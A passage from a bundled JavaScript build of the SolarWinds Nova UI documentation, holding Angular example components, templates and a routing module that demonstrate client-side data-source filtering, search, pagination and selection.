WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectionStrategy,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    ListService,\n    PaginatorComponent,\n    RepeatComponent,\n    RepeatSelectionMode,\n    SearchComponent,\n    SelectionType,\n} from "@nova-ui/bits";\n\ninterface IExampleItem {\n    color: string;\n}\n\n@Component({\n    selector: "nui-client-side-with-selection-example",\n    providers: [ClientSideDataSource],\n    templateUrl: "./client-side-with-selection.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class DataSourceWithSelectionExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public searchTerm = "";\n    public page = 1;\n\n    public state: INovaFilteringOutputs = {};\n\n    @ViewChild(PaginatorComponent) paginator: PaginatorComponent;\n    @ViewChild(SearchComponent) search: SearchComponent;\n    @ViewChild(RepeatComponent) repeat: RepeatComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IExampleItem>,\n        public changeDetection: ChangeDetectorRef,\n        private listService: ListService\n    ) {\n        dataSourceService.setData(getData());\n    }\n\n    async ngAfterViewInit(): Promise<void> {\n        this.dataSourceService.registerComponent({\n            search: {\n                componentInstance: this.search,\n            },\n            paginator: {\n                componentInstance: this.paginator,\n            },\n            repeat: {\n                componentInstance: this.repeat,\n            },\n        });\n\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = { ...this.state, ...data };\n                    this.state = this.listService.updateSelectionState(\n                        this.state\n                    );\n\n                    this.changeDetection.detectChanges();\n                }\n            );\n\n        await this.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public async applyFilters(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public onSelectorOutput(selectionType: SelectionType): void {\n        this.state = this.listService.applySelector(selectionType, this.state);\n    }\n\n    public onRepeatOutput(selectedItems: IExampleItem[]): void {\n        this.state = this.listService.selectItems(\n            selectedItems,\n            RepeatSelectionMode.multi,\n            this.state\n        );\n    }\n}\n\nfunction getData() {\n    return [\n        { color: "regular-blue" },\n        { color: "regular-green" },\n        { color: "regular-yellow" },\n        { color: "regular-cyan " },\n        { color: "regular-magenta" },\n        { color: "regular-black" },\n        { color: "dark-blue" },\n        { color: "dark-green" },\n        { color: "dark-yellow" },\n        { color: "dark-cyan " },\n        { color: "dark-magenta" },\n        { color: "dark-black" },\n        { color: "light-blue" },\n        { color: "light-green" },\n        { color: "light-yellow" },\n        { color: "light-cyan " },\n        { color: "light-magenta" },\n        { color: "light-black" },\n    ];\n}\n'},47930:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Client Side Data Source</h2>\n<p>\n    The main responsibility of a data source is to process one or more filters\n    (e.g. pagination, sorting, search, etc.) from any filtering components\n    before exposing the data to a presentation layer. The\n    <code>ClientSideDataSource</code> aims to allow filtering components to be\n    independent from the main presentation component by allowing each of them to\n    communicate to the service how they each individually want to filter the\n    data. The presentation component can then ask for the pre-filtered data via\n    the service.\n</p>\n<span\n    >Filtering components can be registered with the service in the following\n    manner:</span\n>\n<ul>\n    <li>\n        use\n        <code>\n            this.dataSourceService.componentTree = {{ "{" }} search:\n            {{ "{" }}...{{ "}" }} {{ "}" }};\n        </code>\n        to set components that will be part of filtering process\n    </li>\n    <li>\n        implement <code>getFilteredData</code> in your own service or use\n        existing from <code>ClientSideDataSource</code>\n    </li>\n    <li>use it by subscribing to output and applying newly received data</li>\n</ul>\n<p>\n    Visualization of data flow is available\n    <a\n        target="_blank"\n        href="https://cp.solarwinds.com/display/NU/Filtered+view+communication+mechanism"\n        >here</a\n    >.\n</p>\n\n<nui-message type="critical">\n    <strong>Warning:</strong> If you are planning on using\n    <abbr title="Ahead of Time">AoT</abbr> compilation, avoid\n    <b>directly</b> providing <code>ClientSideDataSource</code>. The search\n    service inside <code>ClientSideDataSource</code> will not be populated under\n    AoT compilation (JIT compilation will work normally). A simple work around\n    is to create a simple class, have it inherit/extend\n    <code>ClientSideDataSource</code>, and then provide that.<br />\n    <p>\n        <nui-example-code language="typescript">{{\n            subclassCode\n        }}</nui-example-code>\n    </p>\n</nui-message>\n\n<nui-example-wrapper\n    filenamePrefix="client-side-basic"\n    exampleTitle="Basic Client Side"\n>\n    <nui-client-side-basic-data-source-example></nui-client-side-basic-data-source-example>\n</nui-example-wrapper>\n\n<h2>Custom Search</h2>\n<p>\n    If needed to fully or partially override logic of\n    <code>SearchService</code>, you can easily provide a new class extended from\n    <code>SearchService</code> using Angular DI on the Component level using\n    <a\n        href="https://angular.io/guide/dependency-injection-providers#alternative-class-providers"\n        >Alternative class provider</a\n    >.\n</p>\n<p>This example shows how to do case-sensitive search.</p>\n<nui-example-wrapper\n    filenamePrefix="client-side-custom-search"\n    exampleTitle="Client-Side Custom Search"\n>\n    <nui-client-side-custom-search-example></nui-client-side-custom-search-example>\n</nui-example-wrapper>\n\n<h2>Delayed Search</h2>\n<p>The rxjs pipe function can be used to introduce a delay or debounce.</p>\n<nui-example-wrapper\n    filenamePrefix="client-side-delayed"\n    exampleTitle="Client Side Delayed"\n>\n    <nui-client-side-delayed-data-source-example></nui-client-side-delayed-data-source-example>\n</nui-example-wrapper>\n\n<h2>Filtering</h2>\n<p>\n    Here we\'re combining several components to implement filter panel. For more\n    information please see inline comments.\n</p>\n<nui-example-wrapper\n    filenamePrefix="client-side-filtering"\n    exampleTitle="Manually Composed Filtering Layout"\n>\n    <nui-client-side-filtering-data-source-example></nui-client-side-filtering-data-source-example>\n</nui-example-wrapper>\n\n<h2>Selection</h2>\n<p>\n    <code\n        ><a href="../injectables/ListService.html" target="_blank"\n            >ListService</a\n        ></code\n    >\n    helps with selection handling, both for the repeat and the selector.\n</p>\n<nui-example-wrapper\n    filenamePrefix="client-side-with-selection"\n    exampleTitle="Client-Side Filtering With Selection"\n>\n    <nui-client-side-with-selection-example></nui-client-side-with-selection-example>\n</nui-example-wrapper>\n'},55238:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-client-side-data-source-docs",\n    templateUrl: "./client-side-data-source-docs.example.component.html",\n})\nexport class ClientSideDataSourceDocsComponent {\n    public subclassCode = `\n@Injectable()\nexport class MyNewClass extends ClientSideDataSource<ExampleItem> {\n    constructor(@Inject(SearchService) searchService: SearchService) {\n        super(searchService);\n    }\n}`;\n}\n'},44331:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiCheckboxModule,\n    NuiDocsModule,\n    NuiExpanderModule,\n    NuiIconModule,\n    NuiImageModule,\n    NuiMessageModule,\n    NuiPaginatorModule,\n    NuiPanelModule,\n    NuiRepeatModule,\n    NuiSearchModule,\n    NuiSelectorModule,\n    NuiSorterModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { DataSourceClientSideBasicExampleComponent } from "./client-side/client-side-basic/client-side-basic.example.component";\nimport { DataSourceClientSideCustomSearchExampleComponent } from "./client-side/client-side-custom-search/client-side-custom-search.example.component";\nimport { DataSourceClientSideDelayedExampleComponent } from "./client-side/client-side-delayed/client-side-delayed.example.component";\nimport { DataSourceClientSideFilteringExampleComponent } from "./client-side/client-side-filtering/client-side-filtering.example.component";\nimport { DataSourceWithSelectionExampleComponent } from "./client-side/client-side-with-selection/client-side-with-selection.example.component";\nimport { ClientSideDataSourceDocsComponent } from "./client-side/docs/client-side-data-source-docs.example.component";\nimport { DepreacatedDataSourceClientSideBasicExampleComponent } from "./deprecated-client-side/client-side-basic/client-side-basic.example.component";\nimport { DepreacatedDataSourceClientSideCustomSearchExampleComponent } from "./deprecated-client-side/client-side-custom-search/client-side-custom-search.example.component";\nimport { DepreacatedDataSourceClientSideDelayedExampleComponent } from "./deprecated-client-side/client-side-delayed/client-side-delayed.example.component";\nimport { DepreacatedDataSourceClientSideFilteringExampleComponent } from "./deprecated-client-side/client-side-filtering/client-side-filtering.example.component";\nimport { DepreacatedDataSourceWithSelectionExampleComponent } from "./deprecated-client-side/client-side-with-selection/client-side-with-selection.example.component";\nimport { DataSourceExampleComponent } from "./deprecated-client-side/docs/data-source-docs.example.component";\n\nconst routes = [\n    {\n        path: "deprecated-client-side",\n        component: DataSourceExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.support,\n                eolDate: new Date("2021-12-31"),\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "client-side",\n        component: ClientSideDataSourceDocsComponent,\n    },\n];\n\n@NgModule({\n    declarations: [\n        ClientSideDataSourceDocsComponent,\n        DataSourceExampleComponent,\n        DepreacatedDataSourceClientSideBasicExampleComponent,\n        DepreacatedDataSourceClientSideFilteringExampleComponent,\n        DepreacatedDataSourceClientSideDelayedExampleComponent,\n        DepreacatedDataSourceClientSideCustomSearchExampleComponent,\n        DepreacatedDataSourceWithSelectionExampleComponent,\n        DataSourceClientSideBasicExampleComponent,\n        DataSourceClientSideFilteringExampleComponent,\n        DataSourceClientSideDelayedExampleComponent,\n        DataSourceClientSideCustomSearchExampleComponent,\n        DataSourceWithSelectionExampleComponent,\n    ],\n    imports: [\n        NuiDocsModule,\n        NuiPaginatorModule,\n        NuiImageModule,\n        NuiIconModule,\n        NuiExpanderModule,\n        NuiSearchModule,\n        NuiRepeatModule,\n        NuiSelectorModule,\n        NuiSorterModule,\n        NuiCheckboxModule,\n        NuiPanelModule,\n        NuiMessageModule,\n        RouterModule.forChild(routes),\n    ],\n    exports: [\n        RouterModule,\n        DataSourceExampleComponent,\n        ClientSideDataSourceDocsComponent,\n    ],\n})\nexport class DataSourceModule {}\n'},88511:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n\n<div class="client-side-example">\n    <div class="d-flex">\n        <div class="flex-row">\n            <nui-search\n                class="searchBar"\n                [value]="searchTerm"\n                (search)="onSearch($event)"\n                #filteringSearch\n            >\n            </nui-search>\n            <nui-repeat\n                class="repeater"\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                #filteringRepeat\n            >\n            </nui-repeat>\n            <nui-paginator\n                class="paginator"\n                [page]="page"\n                [total]="state.paginator?.total"\n                activeClass="active"\n                disabledClass="disabled"\n                showPrevNext="true"\n                (pagerAction)="changePagination()"\n                #filteringPaginator\n            >\n            </nui-paginator>\n        </div>\n    </div>\n</div>\n'},43591:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    INovaFilteringOutputs,\n    LocalFilteringDataSource,\n    PaginatorComponent,\n    SearchComponent,\n} from "@nova-ui/bits";\n\nconst RANDOM_ARRAY = [\n    { color: "regular-blue" },\n    { color: "regular-green" },\n    { color: "regular-yellow" },\n    { color: "regular-cyan " },\n    { color: "regular-magenta" },\n    { color: "regular-black" },\n    { color: "dark-blue" },\n    { color: "dark-green" },\n    { color: "dark-yellow" },\n    { color: "dark-cyan " },\n    { color: "dark-magenta" },\n    { color: "dark-black" },\n    { color: "light-blue" },\n    { color: "light-green" },\n    { color: "light-yellow" },\n    { color: "light-cyan " },\n    { color: "light-magenta" },\n    { color: "light-black" },\n];\n\ninterface ExampleItem {\n    color: string;\n}\n\n/**\n * TODO: Remove in v12 - NUI-5835\n * @deprecated\n */\n@Component({\n    selector: "nui-deprecated-client-side-basic-data-source-example",\n    providers: [LocalFilteringDataSource],\n    templateUrl: "./client-side-basic.example.component.html",\n})\nexport class DepreacatedDataSourceClientSideBasicExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public searchTerm = "";\n    public page = 1;\n\n    public state: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n        paginator: {\n            // @ts-ignore: used for demo purposes\n            total: undefined,\n        },\n    };\n\n    public filters: any[];\n    public selectedFilters: any[];\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: LocalFilteringDataSource<ExampleItem>,\n        public changeDetection: ChangeDetectorRef\n    ) {\n        dataSourceService.setData(RANDOM_ARRAY);\n\n        this.filters = ["regular", "dark", "light"];\n        this.selectedFilters = [];\n    }\n\n    async ngAfterViewInit(): Promise<void> {\n        this.dataSourceService.registerComponent({\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        });\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = data;\n                    if (data && data.paginator && data.paginator.reset) {\n                        this.filteringPaginator.page = 1;\n                    }\n                    this.changeDetection.detectChanges();\n                }\n            );\n        await this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public async onSearch(value: string): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public async changePagination(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n\n    public async applyFilters(): Promise<void> {\n        await this.dataSourceService.applyFilters();\n    }\n}\n'},67327:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n\n<div class="client-side-example">\n    <div class="d-flex">\n        <div class="flex-row">\n            <nui-search\n                class="searchBar"\n                [value]="searchTerm"\n                (search)="onSearch($event)"\n                #filteringSearch\n            >\n            </nui-search>\n            <nui-repeat\n                class="repeater"\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                #filteringRepeat\n            >\n            </nui-repeat>\n            <nui-paginator\n                class="paginator"\n                [page]="page"\n                [total]="state.paginator?.total"\n                activeClass="active"\n                disabledClass="disabled"\n                showPrevNext="true"\n                (pagerAction)="changePagination()"\n                #filteringPaginator\n            >\n            </nui-paginator>\n        </div>\n    </div>\n</div>\n'},52391:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectorRef,\n    Component,\n    Injectable,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    INovaFilteringOutputs,\n    LocalFilteringDataSource,\n    PaginatorComponent,\n    SearchComponent,\n    SearchService,\n} from "@nova-ui/bits";\n\nconst RANDOM_ARRAY = [\n    { color: "regular-blue" },\n    { color: "regular-green" },\n    { color: "regular-yellow" },\n    { color: "regular-cyan " },\n    { color: "regular-magenta" },\n    { color: "regular-black" },\n    { color: "dark-blue" },\n    { color: "dark-green" },\n    { color: "dark-yellow" },\n    { color: "dark-cyan " },\n    { color: "dark-magenta" },\n    { color: "dark-black" },\n    { color: "light-blue" },\n    { color: "light-green" },\n    { color: "light-yellow" },\n    { color: "light-cyan " },\n    { color: "light-magenta" },\n    { color: "light-black" },\n];\n\ninterface ExampleItem {\n    color: string;\n}\n\n@Injectable()\nexport class ClientSideCustomSearchService extends SearchService {\n    protected filterPredicate(item: any, searchValue: any): boolean {\n        return item.toString().indexOf(searchValue.toString()) !== -1;\n    }\n}\n\n/**\n * TODO: Remove in v12 - NUI-5835\n * @deprecated\n */\n@Component({\n    selector: "nui-deprecated-client-side-custom-search-example",\n    templateUrl: "./client-side-custom-search.example.component.html",\n    providers: [\n        LocalFilteringDataSource,\n        { provide: SearchService, useClass: ClientSideCustomSearchService },\n    ],\n})\nexport class DepreacatedDataSourceClientSideCustomSearchExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public searchTerm = "";\n    public page = 1;\n\n    public state: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n        paginator: {\n            // @ts-ignore: used for demo purposes\n            total: undefined,\n        },\n    };\n\n    public filters: any[];\n    public selectedFilters: any[];\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: LocalFilteringDataSource<ExampleItem>,\n        public changeDetection: ChangeDetectorRef\n    ) {\n        dataSourceService.setData(RANDOM_ARRAY);\n\n        this.filters = ["regular", "dark", "light"];\n        this.selectedFilters = [];\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        };\n        this.dataSourceService.applyFilters();\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = data;\n                    if (data && data.paginator && data.paginator.reset) {\n                        this.filteringPaginator.page = 1;\n                    }\n                    this.changeDetection.detectChanges();\n                }\n            );\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public onSearch(value: string): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public changePagination(): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public applyFilters(): void {\n        this.dataSourceService.applyFilters();\n    }\n}\n'},55871:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #repeatItemTemplate let-item="item">\n    <div>{{ item.color }}</div>\n</ng-template>\n<div class="client-side-delayed-example">\n    <div class="d-flex">\n        <div class="flex-row">\n            <nui-search\n                [value]="searchTerm"\n                (inputChange)="onSearch()"\n                (cancel)="onSearch()"\n                #filteringSearch\n            >\n            </nui-search>\n            <nui-repeat\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                #filteringRepeat\n            >\n            </nui-repeat>\n            <nui-paginator\n                [page]="page"\n                [total]="state.paginator?.total"\n                activeClass="active"\n                disabledClass="disabled"\n                showPrevNext="true"\n                (pagerAction)="changePagination()"\n                #filteringPaginator\n            >\n            </nui-paginator>\n        </div>\n    </div>\n</div>\n'},93351:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    ChangeDetectorRef,\n    Component,\n    OnDestroy,\n    ViewChild,\n} from "@angular/core";\nimport { Subject } from "rxjs";\nimport { Subscription } from "rxjs";\nimport { debounceTime } from "rxjs/operators";\n\nimport {\n    INovaFilteringOutputs,\n    LocalFilteringDataSource,\n    PaginatorComponent,\n    SearchComponent,\n    SorterComponent,\n} from "@nova-ui/bits";\n\nconst INITIAL_ARRAY = [\n    { color: "regular-blue" },\n    { color: "regular-green" },\n    { color: "regular-yellow" },\n    { color: "regular-cyan" },\n    { color: "regular-magenta" },\n    { color: "regular-black" },\n    { color: "dark-blue" },\n    { color: "dark-green" },\n    { color: "dark-yellow" },\n    { color: "dark-cyan" },\n    { color: "dark-magenta" },\n    { color: "light-blue" },\n    { color: "light-green" },\n    { color: "light-yellow" },\n    { color: "light-cyan" },\n    { color: "light-magenta" },\n];\n\n/**\n * TODO: Remove in v12 - NUI-5835\n * @deprecated\n */\n@Component({\n    selector: "nui-deprecated-client-side-delayed-data-source-example",\n    providers: [LocalFilteringDataSource],\n    templateUrl: "./client-side-delayed.example.component.html",\n})\nexport class DepreacatedDataSourceClientSideDelayedExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public searchTerm = "";\n    public page = 1;\n    public sorter = {\n        columns: ["color", "red", "green", "blue"],\n        sortedColumn: "color",\n        direction: "asc",\n    };\n\n    public state: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n        paginator: {\n            // @ts-ignore: used for demo purposes\n            total: undefined,\n        },\n    };\n\n    public filters: any[];\n    public selectedFilters: any[];\n\n    private delayActionSubject = new Subject<void>();\n    private outputsSubscription: Subscription;\n\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n    @ViewChild("filteringSorter") filteringSorter: SorterComponent;\n\n    constructor(\n        public dataSourceService: LocalFilteringDataSource<any>,\n        public changeDetection: ChangeDetectorRef\n    ) {\n        dataSourceService.setData(INITIAL_ARRAY);\n\n        this.filters = ["regular", "dark", "light"];\n        this.selectedFilters = [];\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        };\n        this.dataSourceService.applyFilters();\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = data;\n                    if (data.paginator?.reset) {\n                        this.filteringPaginator.page = 1;\n                    }\n                    this.changeDetection.detectChanges();\n                }\n            );\n        this.delayActionSubject.pipe(debounceTime(500)).subscribe(() => {\n            this.dataSourceService.applyFilters();\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public onSearch(): void {\n        this.delayActionSubject.next();\n    }\n\n    public changePagination(): void {\n        this.dataSourceService.applyFilters();\n    }\n}\n'},71159:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #listRepeatItemTemplate let-item="item">\n    <div>{{ item.color }}&nbsp;</div>\n    <div>{{ item.status }}</div>\n</ng-template>\n\n<ng-template #emptyListTemplate>\n    <div class="d-flex flex-column align-items-center">\n        <nui-image [isWatermark]="true" image="no-data-to-show"></nui-image>\n        <p class="nui-text-small">No data to show</p>\n    </div>\n</ng-template>\n\n<div>\n    <nui-panel [panelMode]="panelOptions.panelMode" id="collapsible-panel">\n        <div nuiPanelEmbeddedHeading>{{ panelOptions.heading }}</div>\n        <div nuiPanelEmbeddedBody>\n            <nui-expander\n                [open]="statusExpanderOptions.expanded"\n                [header]="statusExpanderOptions.header"\n                icon="orion-sitemaster"\n                class="mb-5"\n            >\n                <nui-checkbox-group\n                    id="nui-demo-checkbox-group-basic"\n                    name="cType"\n                    [values]="selectedColorTypes"\n                    (valuesChange)="onSelectedColorTypesChange($event)"\n                >\n                    <nui-checkbox\n                        *ngFor="let status of allStatuses; let i = index"\n                        [value]="status"\n                        [checked]="isColorTypeChecked(status)"\n                    >\n                        <div class="d-flex align-items-center">\n                            <nui-icon\n                                class="mr-2"\n                                [icon]="statusIcons[status].iconName"\n                            ></nui-icon>\n                            <span class="mr-2">{{ status }}</span>\n                            <span\n                                *ngIf="isGreaterThanZero(showStatus(status))"\n                                class="mr-2"\n                                >{{ showStatus(status) }}</span\n                            >\n                        </div>\n                    </nui-checkbox>\n                </nui-checkbox-group>\n            </nui-expander>\n            <nui-expander\n                [open]="colorExpanderOptions.expanded"\n                [header]="colorExpanderOptions.header"\n                icon="orion-sitemaster"\n                class="mb-5"\n            >\n                <nui-checkbox-group\n                    id="nui-demo-checkbox-group-basic"\n                    name="criteriaColor"\n                    [values]="selectedCriteriaColors"\n                    (valuesChange)="onSelectedCriteriaChange($event)"\n                >\n                    <nui-checkbox\n                        